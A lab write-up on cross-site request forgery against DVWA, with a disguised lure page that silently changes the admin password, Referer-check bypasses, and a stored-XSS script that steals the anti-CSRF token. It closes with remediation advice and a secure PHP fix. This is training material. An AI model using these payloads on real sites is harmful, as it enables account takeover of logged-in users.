## 1. Introduction

Cross-Site Request Forgery (CSRF) is an attack that tricks a victim into unintentionally sending an authenticated HTTP request to a web application where they're currently logged in. The attacker can force the victim to perform state-changing actions such as changing their password, email, or making transactions — without their knowledge.

**Goal of this lab:** Craft a malicious HTML page that changes the DVWA admin's password when visited, without the admin's knowledge.

## 3. Vulnerability Overview

### What is CSRF?

CSRF exploits the trust a web application has in a logged-in user's browser. When a victim visits a malicious page, that page silently sends an authenticated request to the target site using the victim's existing session cookie.

**Attack Flow:**
```
1. Admin logs into DVWA (session cookie set)
2. Admin visits attacker's malicious page
3. Malicious page triggers request to DVWA change-password endpoint
4. DVWA processes request using admin's session → password changed
5. Admin is locked out
```

**Vulnerable Code (PHP – Low Level):**
```php
// No CSRF token check
if (isset($_GET['password_new']) && isset($_GET['password_conf'])) {
    $pass_new  = $_GET['password_new'];
    $pass_conf = $_GET['password_conf'];
    // Password updated directly
}
```

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → CSRF. Set security to **Low**.

#### Step 1 – Understand the Password Change Request

1. Open Burp Suite → enable Intercept
2. Enter new password in DVWA CSRF module and submit
3. Catch the GET request:

```
GET /dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change HTTP/1.1
Host: localhost
Cookie: PHPSESSID=abc123; security=low
```

**Observation:** Password change is a simple GET request with no CSRF token.

#### Step 2 – Craft the Malicious HTML Page

Create `csrf_attack.html` on Kali:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Free Hacking Course!</title>
</head>
<body>
  <h1>🎉 Claim Your Free Ethical Hacking Course!</h1>
  <p>Click below to claim your prize...</p>
  
  <!-- CSRF attack hidden from victim -->
  <img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change" 
       width="0" height="0" style="display:none" />
  
  <p>Loading your reward...</p>
</body>
</html>
```

The `<img>` tag fires a GET request automatically when the page loads — the victim sees nothing suspicious.

#### Step 3 – Host the Malicious Page

```bash
python3 -m http.server 8080
```

The attack page is now at: `http://192.168.x.x:8080/csrf_attack.html`

#### Step 4 – Victim Visits the Page

When the **logged-in admin** visits `http://192.168.x.x:8080/csrf_attack.html`:

- Browser silently sends: `GET http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change`
- With the admin's session cookie attached
- DVWA processes it and changes the password to `hacked123`

**Verification:** Try logging into DVWA with `admin:hacked123` → ✅ Success

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** The application now checks the **Referer header** to ensure the request came from the same site.

#### Step 1 – Test Basic Attack (Blocked)

The simple `<img>` attack fails because the Referer header points to the attacker's site, not DVWA.

#### Step 2 – Bypass via Referer Spoofing

The Referer check only verifies that the string `localhost` (or the DVWA hostname) appears somewhere in the Referer. We can bypass this by hosting our attack page at a URL containing the target hostname.

**Method 1 – Subdomain trick (name contains target):**
If the check is a simple `strpos()` or `substr()` match:
```
http://localhost.attacker.com/csrf_attack.html
```

**Method 2 – Burp Suite Referer Manipulation:**

1. Use Burp to intercept the CSRF request from the attack page
2. Manually set the Referer header:
```
Referer: http://localhost/dvwa/vulnerabilities/csrf/
```
3. Forward the modified request

**Modified request headers:**
```
GET /dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change HTTP/1.1
Host: localhost
Referer: http://localhost/dvwa/vulnerabilities/csrf/
Cookie: PHPSESSID=abc123; security=medium
```

**Result:** Password changed successfully.

#### Step 3 – HTML Iframe Bypass

Host the attack page inside an iframe on a page at `localhost`:
```html
<iframe src="csrf_attack.html" style="display:none"></iframe>
```

If hosted within the DVWA origin (e.g., via Stored XSS), the Referer is automatically valid.

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** The application now uses an **anti-CSRF token** (a random token embedded in the form that must be submitted with each request).

#### Step 1 – Inspect the Token

View the DVWA CSRF page source:
```html
<input type='hidden' name='user_token' value='a1b2c3d4e5f6...' />
```

The token is unique per session and must be included in the request.

#### Step 2 – Steal Token via XSS (Chained Attack)

This level requires combining CSRF with XSS to steal the token. If a Stored XSS vulnerability exists elsewhere on DVWA:

**Step A – Stored XSS Payload to Steal CSRF Token:**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '/dvwa/vulnerabilities/csrf/', true);
xhr.onload = function() {
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
    var token = doc.querySelector('input[name="user_token"]').value;
    // Send token + change password request
    var xhr2 = new XMLHttpRequest();
    xhr2.open('GET', '/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=' + token, true);
    xhr2.send();
};
xhr.send();
</script>
```

**Step B – Inject via XSS Stored (Guestbook):**
Insert the payload in the guestbook message field.

**Step C – Admin visits guestbook:**
1. XSS payload fires
2. CSRF token is extracted from the CSRF page
3. Password change request is sent with valid token
4. Password changed successfully

## 7. Remediation Recommendations

| Fix                           | Description                                                        |
|-------------------------------|--------------------------------------------------------------------|
| **CSRF Tokens**               | Generate cryptographically random tokens per session and validate  |
| **SameSite Cookie Attribute** | Set `SameSite=Strict` or `SameSite=Lax` on session cookies        |
| **Double Submit Cookie**      | Compare token in cookie with token in request parameter            |
| **Referer Validation**        | Strictly validate Referer header (not just substring match)        |
| **Re-authentication**         | Require current password confirmation for sensitive actions        |
| **Custom Headers**            | Use custom HTTP headers (e.g., `X-Requested-With`) that CORS blocks|

**Secure Code Fix (PHP):**
```php
// Generate token (store in session)
session_start();
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// In form
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// Validate on submit
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF token validation failed');
}
```
